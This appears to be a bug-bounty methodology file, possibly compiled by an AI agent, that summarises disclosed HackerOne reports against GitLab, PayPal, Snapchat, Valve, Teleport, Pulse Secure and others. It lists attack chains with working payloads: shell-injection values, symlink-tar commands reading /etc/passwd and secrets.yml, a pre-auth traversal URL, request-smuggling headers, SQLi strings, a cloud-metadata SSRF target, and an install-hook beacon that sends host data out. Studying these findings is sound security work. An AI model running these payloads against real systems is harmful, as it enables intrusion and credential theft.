# reporting-process — part 2/4 (6 segment(s))
# content-aware dedupe applied; every unique entry preserved.

### [bugbountyhuntingskills.md] 3.3 State-changing side effects beat data disclosure

**Sources:** HackerOne #1733627 (TikTok Now Android — change "Who Can View" privacy on *any* user's
Memory, High); #3154983 (Mozilla Firefox Accounts — account deletion via session misbinding, High);
#2139190 (HackerOne `LockReport` GraphQL mutation on public reports, $2,500).

**Core method**
- Prioritise mutations over queries. A read-IDOR leaks data; a write-IDOR changes state and lands a
  severity tier higher for the same amount of missing code.
- Where the object is a *setting*, the impact is privacy/availability, and that is what you argue in
  the report: an attacker can silently flip a victim's visibility to public (TikTok) or destroy the
  account (Mozilla).
- Mozilla case detail: the endpoint took an `authPW` value and mis-bound it to the session rather
  than to the authenticated identity — so the server could be made to act on a different account
  than the caller.

**Lesson on triage.** Mozilla pushed back that exploitation required access to the victim's mailbox
(to derive `authPW`). The researcher re-framed impact around the *authorization* failure rather than
the practical preconditions, and it was accepted as High. Pre-empt the "attacker needs X" objection
by defining impact at the level the program's policy actually grades.

---

## [bugbountyhuntingskills.md] 10. Information disclosure and PII

### [bugbountyhuntingskills.md] 10.5 Memory disclosure through an image library — Basecamp

**Source:** HackerOne report by @neex, **$8,868**; HackerOne blog (2024-11).

**Core method**
- An outdated `librsvg` had an uninitialized-memory bug when rasterizing crafted SVG.
- Upload an SVG that causes the renderer to emit uninitialized heap bytes into the output image.
- The leaked bytes contained AWS keys and session cookies from other requests handled by the same
  worker.
- Detection is statistical: render the same SVG many times, compare output bytes; non-deterministic
  regions are the leak.

**Lesson.** Image/PDF/video transcoders run in the same process as request handling and can leak
*other users'* memory. This class (CWE-200 via CWE-457) is under-tested: craft inputs at the edges of
the decoder (truncated headers, unusual color depths, embedded ICC profiles) and diff outputs across
runs.

---

### [bugbountyhuntingskills.md] 10.6 Disclosure checklist (synthesis)

- [ ] `.json` / `.xml` / `?format=` siblings of every authenticated HTML page.
- [ ] `fields=`, `expand=`, `include=`, `embed=`, `depth=` — request more than the UI does.
- [ ] Error verbosity: force a 500 and read stack traces, SQL, internal hostnames, library versions.
- [ ] Source maps: `app.js.map`, `main.css.map` → original TypeScript with comments and internal URLs.
- [ ] Spring Boot Actuator: `/actuator/env`, `/actuator/heapdump`, `/actuator/httptrace`,
  `/actuator/mappings`; Django `DEBUG=True`; Laravel `.env`; Rails `/rails/info/properties`.
- [ ] Swagger/OpenAPI at `/swagger.json`, `/openapi.json`, `/v2/api-docs`, `/api-docs`.
- [ ] Debug headers: `X-Debug-Token`, `Server-Timing`, `X-Powered-By`, `Via`.
- [ ] Third-party JS (`analytics`, `support widgets`) for internal hostnames and staging keys.
- [ ] `robots.txt`, `sitemap.xml`, `/.well-known/security.txt` for paths the app "hides".

---

## [bugbountyhuntingskills.md] Information disclosure

site:hackerone.com "information disclosure" ("pii" OR "email" OR "token") disclosed
site:medium.com "graphql" "introspection" ("pii" OR "access control")

## [bugbountyhuntingskills.md] Knowledge intake — reader pass 2026-11-07 (batch: 6 reports)

SOURCE: https://hackerone.com/reports/1609965  2026-11-07
CLASS: command injection / RCE (CWE-78) — GitLab DecompressedArchiveSizeValidator + BulkImport ProjectPipeline
CORE METHOD:
  1. Sink is a shell STRING: `DecompressedArchiveSizeValidator#command = "gzip -dc #{@archive_path} | wc -c"`, passed as a string to `Open3.popen3(command)`. Shell interpolation ⇒ any metachar in the path runs commands (the array form `["gzip","-dc",path]` would be safe; the string form is not).
  2. `@archive_file` comes from `project.import_source` (via ImportExport::Importer → FileImporter). Normally import_source is nil and derived, so find the path where it becomes attacker-settable.
  3. Entry point = `BulkImports::Projects::Pipelines::ProjectPipeline`. Its transformers only strip a `PROHIBITED_REFERENCES` regex (`cached_markdown_version`, `id`, `*_id`, `*_ids`, `*_html`, `attributes`, `remote_*_(url|urls|request_header)`) and pass the REST of the JSON straight into `Projects::CreateService`. So set `import_source` to a shell payload.
  4. `import_source` alone leaves `import_type=gitlab_project_migration` (import_schedule skipped). Flip it live by ALSO sending `template_name=rails`: CreateService routes to `CreateFromTemplateService` → `GitlabProjectsImportService`, which sets `import_type='gitlab_project'` when a template file is present ⇒ `import_schedule` runs ⇒ your `import_source` becomes `@archive_file`.
  5. Deliver: run "import group from another GitLab instance" pointed at YOUR fake GitLab API server that proxies the real API but injects `template_name`+`import_source` into the exported project's attributes. After `wait_for_archived_file` times out (~255s; MAX_RETRIES loop continues) `validate_decompressed_archive_size` fires ⇒ payload executes on the Sidekiq worker.
  6. Payload: `"import_source":"/tmp/ggg;echo lala|tee /tmp/1234;#"` (cannot contain `>` — JSON makes it `\u003c`). Worker-log tell: `command exited with error code 2: tar (child): /tmp/ggg;echo lala|tee /tmp/1234;#: Cannot open`.
DETECTION SIGNAL: any sink that builds a shell command by string-interpolation from a user/import/config value and hands the STRING to `Open3.popen3`/`system`/backticks; an import/migration pipeline that allow-lists-out only a few keys then merges the rest into a create-service (`import_source`, `template_name`); a feature-flag-gated import path that is under-audited.
CHAIN: authenticated low-priv import → unfiltered `import_source` param merged into project create → `template_name` flips import_type to `gitlab_project` → path with shell metachars reaches `Open3.popen3(string)` → RCE as the `git` service user → full instance compromise (Critical 9.9, $33,510, CVE-2022-2185).
TRANSFERABLE TEST: For every import/migration/export/backup feature, set any path/URL/source field to `x;id;#` (also `` `id` ``, `$(id)`, `|id`) and grep the worker/error log for your payload echoed inside a shell error message — that string-echo proves it reached a shell-string sink. In parallel grep the code for `popen(`/`system(`/backticks fed by an interpolated string vs an array.

SOURCE: https://hackerone.com/reports/925585  2026-11-07
CLASS: code injection via supply chain / dependency confusion (CWE-427) — PayPal npm
CORE METHOD:
  1. Enumerate package names the target's builds resolve but that exist only internally: leaked `package.json` in public repos, source maps, error logs, `.npmrc` scope config, JS bundles referencing scoped deps.
  2. Check each name on the PUBLIC registry; if unclaimed, register it there.
  3. Publish with a HIGHER semver than the internal one and an install hook — `"scripts":{"preinstall":"node beacon.js"}`. npm resolves the highest version across configured registry/indexes and runs lifecycle scripts on install alone (the package need not be `require`d).
  4. Wait and confirm execution by DNS/HTTP callback from inside the corp build network (beacon exfiltrates hostname/whoami). PayPal's own summary: "certain development projects defaulted to the public NPM registry instead of the intended internal packages; since the packages on the public registry did not exist, the researcher created these and observed they were downloaded."
DETECTION SIGNAL: a repo/build config referencing internal, UNSCOPED package names with no registry/scope pin (`.npmrc` `@scope:registry=`, yarn `npmRegistryServer`, bundler source scoping); manifest names that are unclaimed/404 on the public registry; CI installing with the default registry.
CHAIN: unclaimed internal package name → attacker publishes a higher-version public twin with an install hook → CI/dev machine resolves the public package → preinstall/postinstall script runs inside the corp network → RCE → supply-chain compromise (Critical 10.0, $30,000; alexbirsan & rhynorater).
TRANSFERABLE TEST: Harvest dependency names from leaked manifests/bundles → check each on the public registry (`npm view <name>`, `pip index versions`, `gem search`); if unclaimed, publish a benign same-named canary at version 99.99.99 with a DNS-beacon install script and wait for a callback from the target's network. Same primitive across npm, PyPI, RubyGems, Maven.

SOURCE: https://hackerone.com/reports/1439593  2026-11-07
CLASS: path traversal / arbitrary file read via archive symlink (CWE-59 / CWE-22) — GitLab bulk-import UploadsPipeline
CORE METHOD:
  1. `BulkImports::Pipeline::ExtractedData` lists every path under the extracted `uploads.tar.gz` with `Dir.glob(File.join(tmp_dir,'**','*'))` AFTER `untar_zxf` — which "only changes the permissions" and does NOT strip symlinks.
  2. Craft `uploads.tar.gz` whose entries are SYMLINKS to server files:
     `mkdir ./<32-byte-upload-secret> && ln -s /etc/passwd ./<secret>/passwd && ln -s /srv/gitlab/config/secrets.yml ./<secret>/secrets.yml && tar cvzf uploads.tar.gz ./<secret>`
  3. The 32-byte secret is the upload-path hash you get by first uploading a normal file `passwd` into a milestone description (the import re-downloads/re-extracts that upload).
  4. At `load`, the symlink is FOLLOWED: `UploadService.new(context.portable, File.open(file_path,'r'), ...)` reads the TARGET file and stores it as the imported upload (downloadable with git-user privileges).
  5. Serve the crafted tar from a small proxy / fake remote GitLab; run "import group"; open the imported milestone and click `passwd` → /etc/passwd; swap the name for `secrets.yml` → secrets file.
DETECTION SIGNAL: any archive extract-then-process flow (group/project import, theme/plugin upload, backup restore, user-content tar/zip) that globs/recursively walks extracted files but never rejects symlink entries or checks that the resolved path stays inside the extraction dir; a later `File.open` on a path never `realpath`-validated against the base dir.
CHAIN: helper-role user who can import a group → symlinks survive untar → symlink followed on load → arbitrary file read as `git` → `secrets.yml` (`secret_key_base`, `otp_key_base`, `db_key_base`, `openid_connect_signing_key`, `ci_jwt_signing_key`) + `gitlab.yml` object-store creds + `gitlab-registry.key` → read all backups, use `db_key_base` to decrypt `attr_encrypted` (`bulk_import_configurations`, CI variables, app settings) → Critical 9.6 (raised from high 8.6) → $29,000.
TRANSFERABLE TEST: For any archive-upload/import feature, build a tar/zip containing a symlink entry to `/etc/passwd` (and to the app's config/secrets path), upload/import, then request the resulting stored object; if you get the target file back it is arbitrary file read. Also test `../`-named entries and whether extraction resolves paths back into the base dir.

SOURCE: https://hackerone.com/reports/455645  2026-11-07
CLASS: exposed orchestration API / auth-missing misconfig → RCE + credential theft (CWE-306) — Snapchat Kubernetes
CORE METHOD:
  1. Discovery: worldwide scan for internet-exposed Kubernetes control-plane/kubelet APIs (report used binaryedge.io). Candidates: `:6443`, `:8443`, `:8080`, `:10250`, any API server answering without auth.
  2. Confirm unauthenticated access — `GET /version`, `GET /api/v1/namespaces`, `GET /api/v1/pods` return data / `200` with NO `Authorization` header (or a default/blank SA token is accepted).
  3. Enumerate with no creds: `kubectl --server=https://<host>:6443 --insecure-skip-tls-verify get pods,sa,secrets -A`; the report's access was effectively cluster-admin.
  4. Escalate to code execution: create a job/pod (privileged container or host-path mount) to run arbitrary commands on the node; or read mounted service-account tokens / `secrets` objects to reach other services.
  5. Harvest credentials reachable from cluster-admin → "internal access to a significant number of instances" (per Snapchat's summary).
DETECTION SIGNAL: a k8s API server, kubelet (`:10250/pods`, `/run`), dashboard, or etcd reachable from the internet answering with no auth (`GET /api/v1/namespaces` returns JSON); anonymous-auth enabled / `system:anonymous` bound to broad verbs; no NetworkPolicy.
CHAIN: internet-exposed unauthenticated k8s API → act as cluster-admin → create privileged pod/job → RCE on cluster nodes → read Secret objects / mounted SA tokens → lateral access to many internal instances → Critical (9–10, $25,000).
TRANSFERABLE TEST: On any exposed cluster endpoint run `kubectl get pods,sa,secrets -A --server=... --insecure-skip-tls-verify` with NO token, plus `kubectl auth can-i --list`; if it returns objects you are unauthenticated — prove with ONE benign pod/job (whoami) and STOP (no availability impact), then read one non-destructive Secret to show credential reach.

SOURCE: https://hackerone.com/reports/2262382  2026-11-07
CLASS: SSRF via unsanitised value injected into HTML rendered by a PDF / headless-browser generator (CWE-918) — HackerOne Analytics Reports
CORE METHOD:
  1. Entry: the analytics-report PDF export takes a document spec whose entries include `{type:'template', template:<value>}`. If `template_path` resolves it renders a partial; if NOT, the code returns an error STRING with the raw value interpolated: `"Missing template for element: #{element[:template]}"`.
  2. That string is part of `html_without_layout`, which is "fed into a library that converts this into a PDF".
  3. Put an `<iframe>` (or `<img src=…>`/`<link>`) in the `template` value ⇒ your HTML lands in the PDF document ⇒ the generator's browser engine FETCHES the URL ⇒ server-side request from the app server.
  4. Point it at the cloud metadata service (IMDS) to pull temporary AWS credentials.
  5. Vendor diff (the fix) proves the vector: `-"Missing template for element: #{element[:template]}"` → `+"Missing template for element"` (reflected input removed).
DETECTION SIGNAL: any feature that renders user-influenced content to PDF/image via a headless browser or HTML→PDF library (invoice/report export, "download as PDF", email-to-PDF, screenshot-as-a-service); user input echoed into an HTML string — INCLUDING error messages — that is then rendered; a renderer allowed to make outbound requests (no network isolation).
NOTE: source #2262382 is already cited in the ledger §2.2 for the "error message as response oracle" angle; this entry records the distinct, previously-unrecorded mechanism — HTML injection into the PDF renderer as the SSRF vector.
CHAIN: controllable `template` value reflected into an HTML string → HTML/iframe injection into the PDF render step → headless browser fetches an attacker URL → SSRF to `169.254.169.254/latest/meta-data/iam/security-credentials/` → temp AWS creds → account/asset access (Critical 10.0, $25,000; CVSS AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N).
TRANSFERABLE TEST: At every PDF/HTML render sink inject `<iframe src="http://<collab>/">` (and in error paths that reflect your input); confirm an outbound hit from the render host, then aim it at the cloud metadata IP (plus GCP/Azure equivalents) to demonstrate credential read. Treat any "template/id/name not found: <input>" error as an HTML-injection candidate into the renderer.

SOURCE: https://hackerone.com/reports/383127  2026-11-07
CLASS: blind SQL injection via array-typed parameter (CWE-89) — Valve report_xml.php
CORE METHOD:
  1. Entry point: `partner.steampowered.com/report_xml.php` (legacy PHP partner reporting/export page).
  2. Injectable parameter is ARRAY-typed: `countryFilter[]`. Array form changes how the value is interpolated into SQL (IN-list / `implode` / quote context) and lets it slip past scalar-input assumptions — that array shape is the crux.
  3. Class confirmed BLIND SQLi (boolean/time-based) by the reporter; extraction read "certain SQL data from a single backing database".
  4. An Akamai WAF fronted the endpoint — reporter's note: "Blind SQL Injection && Akamai WAF Bypass". The exact bypass is NOT disclosed on the page (report body withheld; do not invent it).
Vendor: "An unvalidated parameter on a partner reporting page (report_xml.php) could be used to read certain SQL data from a single backing database." Critical 9.9, $25,000.
DETECTION SIGNAL: legacy PHP/reporting/export endpoints (`*report*`, `*export*`, `*.php?…[]=`) where params are ARRAY-typed (`x[]=`, `x[0]=`, `x[key]=`) — array params are frequently concatenated into SQL differently (IN-lists) and may dodge scalar filters; behind a WAF, a differential block (403/418 vs 200) indicates the injection reached the backend.
CHAIN: unvalidated array parameter on a partner reporting page → blind SQLi → read SQL data from the backing database → Critical 9.9, $25,000 (WAF-bypass step undocumented).
TRANSFERABLE TEST: Send array-style injections — `countryFilter[]=1'`, `countryFilter[0]=1'`, `countryFilter[]=1) AND SLEEP(5)-- -` — to legacy `*.php` report/export endpoints and compare time/boolean responses, keeping a scalar control to confirm the array form behaves differently. When a WAF blocks, record it and enumerate WAF bypasses; never claim a bypass you cannot reproduce.

SOURCE: https://hackerone.com/reports/1685822  2026-11-07
CLASS: server-side URL-fetch scheme-allowlist bypass (`file://`) → arbitrary local repository read (CWE-918-family / CWE-829) — GitLab BulkImports RepositoryPipeline
CORE METHOD:
  1. Entry point: GitLab "import group" (BulkImports). The client-supplied `httpUrlToRepo` from the import graph is used verbatim at load: `url = data['httpUrlToRepo']` → `url.sub("://", "://oauth2:#{config.access_token}@")` → `Gitlab::UrlBlocker.validate!(url, allow_local_network:…, allow_localhost:…)` → `project.repository.fetch_as_mirror(url)`.
  2. Defect: `UrlBlocker.validate!` is called WITHOUT a `schemas:` argument, so it accepts ANY scheme as long as the remainder parses as a URL — including `file://`. Host/IP restrictions are enforced but the protocol is not.
  3. Inject `file://` into `httpUrlToRepo`: `file://aw.rs/var/opt/gitlab/git-data/repositories/@hashed/b1/74/b174103b399555239923697fbe124faa61de4d441bd5c5678275eb0a5a27a562.git` (the token `aw.rs` survives the `://`-substitution and keeps the string URL-shaped; git ignores the host for `file://`).
  4. Derive the on-disk path of ANY project from its integer id: `b = Digest::SHA2.hexdigest("<project_id>")`; repo lives at `<repo_root>/@hashed/<b[0:2]>/<b[2:4]>/<b>.git`.
  5. The server runs `git fetch file://…`; on success the local repo is mirrored into the attacker's imported project → read the full source of any private repository on the instance. (The report's proof was reading GitLab's own CTF project and its flag.)
DETECTION SIGNAL: any server-side "fetch / clone / mirror / import-from-URL" that validates the URL but not the SCHEME allowlist (http/https only); `UrlBlocker.validate`-style helpers invoked without `schemas:`; an import/config API taking a full URL string; storage paths derivable from a public integer id (hash-of-id bucketing).
CHAIN: low-privilege user allowed to run a group import → `httpUrlToRepo=file://…` passes URL validation (no scheme allowlist) → server-side `git fetch` reads a local path → private repository source disclosed by computing `sha2(project_id)` → high (private-source disclosure / BAC).
TRANSFERABLE TEST: On every server-side URL-fetch parameter (import, clone, mirror, webhook URL, remote config, favicon/proxy fetch) swap the scheme: `file://`, `gopher://`, `dict://`, `ftp://`, `git://`, `ssh://`, `jar:file://`, `http://127.0.0.1`. Confirm the code enforces a SCHEME allowlist, not merely host/IP blocks. If the on-disk path is derivable from a public id (hashed store / bucket-by-id), compute it and point `file://` at it.

SOURCE: https://hackerone.com/reports/2281075  2026-11-07
NOTE (fetch honesty): the HackerOne page would NOT render from this egress — web_extract returned HTTP 403 "Upstream forbidden"; the browser tool and https://r.jina.ai/ both hit the Cloudflare "Just a moment…" challenge and were redirected to /users/sign_in; the Wayback Machine capture (2025-04-19) is only a 302 → sign_in and archive.ph had no copy. Technique reconstructed from the CREDITED vendor advisory for this same report — GHSA-76cc-p55w-63g3 (github.com/gravitational/teleport/security/advisories/GHSA-76cc-p55w-63g3, Critical, published 2023-12-29) — plus the public Teleport Access-List docs. Nothing invented. ROUTE THAT WORKED: vendor advisory + product docs.
CLASS: broken function/FIELD-level authorization on a delegated-admin object → vertical privilege escalation (CWE-20 improper input validation / CWE-274 improper handling of insufficient privileges) — Teleport Access Lists
CORE METHOD:
  1. Identify the delegated-admin object and its documented limits. Teleport Access-List OWNERS are documented as able to only "control membership requirements / list members / provision and revoke membership / audit Access Lists" and explicitly NOT to "add or remove owners … or control what roles and traits are granted by the Access List".
  2. The defect (vendor wording): "an Access List Owner [can] assign arbitrary permissions, including permissions to themselves which could result in privilege escalation". The write path enforces "you must be an owner", but the FIELD-level restriction (which fields an owner may set — `grants` / `owner_grants` = roles+traits) is not enforced.
  3. Exploit: as the owner, call the object's write API (Web UI "manage Access List", `tctl`, or the Auth `AccessListService` upsert) and set the list's `grants` (and/or `owner_grants`) to the preset highest roles — `editor` (manage all cluster resources) and/or `access` — then add yourself (or an account you control) as a member that meets the membership requirements.
  4. Log out / re-evaluate membership: Access-List grants are applied at login → the preset highest roles are now held.
DETECTION SIGNAL: any product where a "delegated admin / list owner / team owner / project admin" can WRITE the very object they administer (upsert/PATCH/PUT) even though the vendor docs state only certain fields are owner-editable; the object's `grants`/`roles`/`traits`/`scopes`/`permissions`/`owners`/`members` fields are accepted from the owner's request body; role changes take effect at next login with no second reviewer.
CHAIN: low-privilege user who merely OWNS one Access List → owner-only (not field-level) write authorization → set the list's `grants`/`owner_grants` to preset `editor`/`access` → Access-List grants applied on login → cluster-admin-equivalent privilege (rated Critical; fixed in Teleport 14.2.4 / 13.4.13).
TRANSFERABLE TEST: For every "owner/manager/admin-of-object" role in an RBAC/IGA/IAM system, take the object you own and replay its write API (PUT/PATCH/upsert, JSON body) with the RESTRICTED fields populated — `grants`, `owner_grants`, `roles`, `traits`, `scopes`, `permissions`, `members`, `owners` — including a preset highest-privilege role; also try adding yourself as a member/owner of your own object. If the change persists and is applied at re-auth, it is vertical privilege escalation.

SOURCE: https://hackerone.com/reports/591295  2026-11-07
CLASS: pre-auth arbitrary file read on a perimeter appliance → runtime credential/session-store harvest → 2FA bypass / session-cookie forgery → post-auth command injection → pre-auth RCE (CWE-22 → CWE-522 → CWE-78) — Pulse Connect Secure (Twitter VPN; CVE-2019-11510 / -11539)
CORE METHOD:
  1. Pre-auth file read (CVE-2019-11510): Pulse's web server validates `request->uri` but serves `request->filepath`, and the HTML5-Access/Guacamole feature widened validation. Put `/dana/html5acc/guacamole/` BOTH at the end of the query string (to pass validation) and in the middle of the path (to widen the served extension allowlist):
     `GET https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/`  — no authentication required.
  2. Harvest the appliance runtime state through the same primitive: `/etc/passwd`, `/etc/hosts`, `/data/runtime/mtmp/system` (VPN usernames + hashes), `/data/runtime/mtmp/lmdb/dataa/data.mdb` (+`lock.mdb`), `/data/runtime/mtmp/lmdb/randomVal/data.mdb` (+`lock.mdb`).
  3. What each store gives you: `mtmp/system` holds the 2FA (Duo) integration key + secret `skey` + API hostname and the LDAP bind password; `dataa/data.mdb` is a PLAINTEXT-password cache the appliance never clears after a user's Perl↔C++ exchange; `randomVal/data.mdb` is the session store.
  4. Bypass 2FA two ways: (a) use the leaked Duo `skey` + API hostname to drive the Duo API and mint valid 2FA approvals; or (b) if "Roaming Session" is enabled (session valid from multiple IPs), download `randomVal/data.mdb` and FORGE the session cookie/DSID → log in as that user from your own IP.
  5. Escalate post-auth — CVE-2019-11539, admin command injection in `/dana-admin/diag/diag.cgi`: `tcpdump_options_syntax_check(CGI::param("options"))` runs `system("$TCPDUMP_COMMAND -d $options >/dev/null 2>&1")`; inject shell metacharacters into `options` → RCE as the admin user. Reaching the internet-facing admin layout used an SSRF; the admin hash is `sha256(md5_crypt(salt,…))` (plaintext cached only for first-time logins) and was cracked with a 72-core rig.
  6. Chain = pre-auth file read → plaintext creds + appliance 2FA/session secrets → 2FA bypass / cookie forgery → authenticated session → post-auth admin command injection → pre-auth RCE. Vendor-feature bonus: the SSL-VPN "logon script" runs a script on every connecting client → mass client takeover once admin.
DETECTION SIGNAL: an edge appliance (SSL-VPN / firewall / load-balancer / mail gateway) on the perimeter whose web tier is fingerprintable; a traversal-oracle path (`/dana-*/…/../…`) that serves file contents pre-auth; runtime credential/session stores (`/data/runtime/mtmp/*.mdb`) reachable by that same traversal; session cookies not bound to the client IP (roaming sessions); an admin "diagnostic / ping / tcpdump" page that takes a command-ish parameter.
CHAIN: unauthenticated path traversal on the VPN appliance → read runtime LMDB (plaintext password cache + Duo 2FA keys + session DB) → bypass 2FA (forge/replay session or mint via Duo API) → authenticated VPN session → intranet reach → post-auth admin command injection → RCE (reported as effectively pre-auth RCE; the strongest finding the program had received).
TRANSFERABLE TEST: On any perimeter appliance, try the pre-auth traversal `/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/`; if it reads, pull the runtime stores (`mtmp/system`, `lmdb/dataa/data.mdb`, `lmdb/randomVal/data.mdb`) and use the leaked Duo/session material to bypass MFA. Separately, on any admin diagnostic page submit `options=;id;` / `|id` / `` `id` `` to a tcpdump/ping wrapper — a `system("<string>")` sink there is the RCE.

SOURCE: https://hackerone.com/reports/510152  2026-11-07
ROUTE: report page rendered via web_extract; the full method is in the credited writeup (albinowax) — "HTTP Desync Attacks: Request Smuggling Reborn", portswigger.net/research/http-desync-attacks-request-smuggling-reborn, §PayPal — cited by the report itself.
CLASS: HTTP request smuggling / desync → web-cache poisoning → stored XSS on a login page, incl. bypass of the naive fix (CWE-444 → CWE-79)
CORE METHOD:
  1. Detect desync per endpoint (CL.TE / TE.CL): send a `Content-Length`-mismatched request carrying a `Transfer-Encoding` header OBFUSCATED so the FRONT-END does not recognise it but the BACK-END does, followed by a victim request, then watch for the victim request being answered by the previous request's response. Header-obfuscation variants that hide TE from one server: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding:[tab]chunked`, a line-wrapped `Transfer-Encoding:\r\n\tchunked`, `X: X[\n]Transfer-Encoding: chunked`, duplicate/padded TE headers.
  2. Confirm (prove socket poisoning) without harming users: smuggle a request for a harmless unique path (`GET /404`) so the NEXT real request completes it; a `404`/unique body in the victim response proves the desync ("Detect-Confirm-Explore-Store/Attack" methodology).
  3. Exploit through the CACHE: where a web cache sits in front, issue the attack + victim requests YOURSELF and let the HARMFUL response be cached under a URL other users request. PayPal: desync so the cached response for `https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js` (a JS file loaded by the sign-in page) becomes attacker-controlled → persistent JS hijack on paypal.com/signin.
  4. Get past CSP: the c.paypal.com sub-page (rendered in a dynamically generated iframe on the login page) had NO CSP; a second CSP-less page at `paypal.com/us/gifts` ALSO imported the poisoned JS → redirect the c.paypal.com iframe to that page → run JS for a third time in a CSP-less origin that can reach the parent DOM → read the plaintext password the victim types into the login page (Safari/IE where the redirect/HSTS behaviour permits).
  5. Bypass the FIX (this report is the bypass of #488147): PayPal had patched #488147 by configuring Akamai to REJECT any request containing `Transfer-Encoding: chunked`; a line-wrapped header `Transfer-Encoding:\r\n\tchunked` is still parsed as chunked by the back-end but no longer matches the front-end's naive reject rule → the desync (and the login-page stored XSS) worked AGAIN.
DETECTION SIGNAL: a front-end (CDN/reverse proxy) + back-end chain that disagree on request framing; a web cache in the path; a security control implemented as a substring/regex match on header strings (reject-if-contains "Transfer-Encoding: chunked") instead of correct parsing; login/checkout pages importing a third-party JS file from a separately-cached origin, with a CSP-less sibling page importing the same file.
CHAIN: CL.TE desync (TE header obfuscated to evade the front-end's reject rule) → socket/request poisoning → a harmful redirect/response stored by the web cache under a JS/login URL → attacker JS executes on paypal.com/signin → CSP-less page chain (c.paypal.com iframe → /us/gifts) → parent-DOM read → plaintext PayPal credential theft (High 8.7, $20,000; predecessor #488147 $18,900).
TRANSFERABLE TEST: For every host send `POST /` with `Content-Length: 4` + `Transfer-Encoding: chunked` smuggling `GET /404 HTTP/1.1\r\nX: x`, then a victim request; a unique/`404` body in the victim response = desync. When a proxy "fixes" smuggling by string-matching the TE header, retry with `Transfer-Encoding:\r\n\tchunked`, mixed case, and duplicate/whitespace-padded headers. Prioritise endpoints feeding a cache, and check whether any cached JS is imported by a login/checkout page (or a CSP-less sibling) — that is where the cache-poison becomes stored XSS.

SOURCE: https://hackerone.com/reports/745324  2026-11-07
CLASS: session-token replay / missing session binding → privileged account takeover (CWE-522 insufficiently protected credentials / CWE-384) — HackerOne
CORE METHOD:
  1. Root cause: a HackerOne Security Analyst replied to a hacker and accidentally included one of their OWN valid session cookies in the message. HackerOne's stated position (from the incident report): "due to the entropy of session cookies and in-depth defenses such as HackerOne's strict Content Security Policy, HackerOne had not prioritized any additional defenses that limit a session cookie's ability to be used in a separate browser."
  2. The transferable technique: a session cookie is a BEARER credential. It is not bound to the client that obtained it, so anyone holding the string sets it in their own browser — different IP, different User-Agent, different device — and immediately holds the victim's authenticated session, with no second factor and no re-authentication.
  3. Because the replayed session belonged to a triage Analyst, it reached the Inbox (report titles + limited metadata across programs) and Report View (report contents + internal comments) — the leaked cookie inherited the analyst's full authorization.
  4. The only defence cited was cookie entropy + a strict CSP (removing XSS as a theft vector); there was no session-ID rotation, device binding, or IP binding.
DETECTION SIGNAL: a session/auth cookie (or a bearer token appearing in a URL, a `Set-Cookie` echoed in a support reply, a Referer-leaked token, an export/log/shared doc) that still authenticates from a different IP/User-Agent/device and is NOT rotated on login, logout, or privilege change; no per-session fingerprint field; support workflows that paste raw HTTP messages into tickets/emails.
CHAIN: a session cookie is disclosed (support reply / log / Referer / export) → replayed verbatim from the attacker's own client (no device/IP binding) → authenticated session carrying the victim's full authorization (here a triage Analyst) → read private report titles/metadata/contents + internal comments → ATO of a privileged account (High 8.3, $20,000; weakness re-classed "Insufficiently Protected Credentials").
TRANSFERABLE TEST: Take ONE legitimate session token and replay it from a different IP/User-Agent/clean browser profile (`curl -H 'Cookie: <token>' https://host/account` from another machine); if it authenticates, the session is PORTABLE. Then test whether the token rotates on login/logout/privilege-change and whether the app binds it to a device/IP. Every channel that can expose a cookie (Referer leakage, support/export, shared logs, `.json` dumps, source maps) then escalates straight to ATO — treat "portable session + any cookie leak" as a P1/P2 chain, not a P4.

SOURCE: https://hackerone.com/reports/827052  2026-11-07
ROUTE: the HackerOne page rendered but its body was largely redacted; the exact mechanism was confirmed from the report's own linked GitLab work item #212175 (gitlab.com/gitlab-org/gitlab/-/work_items/212175) and mirrored writeups (hackmag.com/security/read-and-execute; exploit-db 48431). Nothing invented.
CLASS: path traversal in an upload-reference rewriter → arbitrary file read, chained to RCE via `secret_key_base` cookie forgery (CWE-22 → CWE-502) — GitLab UploadsRewriter (CVE-2020-10977)
CORE METHOD:
  1. The `UploadsRewriter` copies uploads referenced in an issue's markdown when the issue is MOVED to another project. It locates references with `MARKDOWN_PATTERN = %r{!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}` and, per match, calls `find_file(source_project, secret, file)` → `FileUploader.new(project, secret: secret).retrieve_from_store!(file)`.
  2. The `file` group is never validated for traversal, so a `../` sequence in the filename resolves to any path on the server.
  3. Put the traversal into an issue description in project A: `![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)` — the 32-hex `secret` can be YOUR OWN upload's secret (create one benign upload first to learn the shape).
  4. Move the issue from project A to project B. The rewriter "copies the upload" — which resolves to `/etc/passwd` — into project B, stores it, and rewrites the markdown to the new upload URL.
  5. Open the issue in project B and request the rewritten upload URL → download the arbitrary file. Repeat for `/etc/passwd`, `/etc/ssh/sshd_config`, `/var/log/auth.log`, GitLab config/secrets, etc.
  6. Chain to RCE: read `/var/opt/gitlab/gitlab-rails/etc/secrets.yml` (`secret_key_base`); with the signing secret, forge a Rails-signed session cookie; GitLab's marshalled-cookie path then yields RCE (vakzz built the read into RCE; CVE-2020-10977, GitLab CE/EE ≥8.5/12.9, patched 12.9.1).
DETECTION SIGNAL: any feature that COPIES/REWRITES user-content file references on move/copy/import/export (markdown upload rewriter, attachment copy across projects, template/issue duplication, quote or ticket migration, export→import); a regex that extracts a filename/path from user content and hands it to a file-store `retrieve_from_store`/`File.open`/copy with no `basename`/traversal check; the "secret" path component is attacker-obtainable (create your own upload).
CHAIN: issue author → `![a](/uploads/<32hex>/../../../../etc/passwd)` in a description → the upload rewriter follows the traversal on "move issue" → arbitrary file read → `secrets.yml` `secret_key_base` + `db_key_base` → forged Rails session cookie / `attr_encrypted` decryption → RCE / full instance compromise (Critical 9–10, $20,000; CVE-2020-10977).
TRANSFERABLE TEST: Anywhere user content references a stored file and the app COPIES it (move issue, duplicate project/template, export/import, attachment migration), inject `![x](/uploads/<your-own-32hex-secret>/../../../../../../etc/passwd)` (also `..%2f`, and absolute paths) into the content, perform the copy/move, then fetch the rewritten reference; if `/etc/passwd` comes back it is arbitrary file read. Then hunt the app's signing secret among the readable paths and test cookie forgery for the escalation.

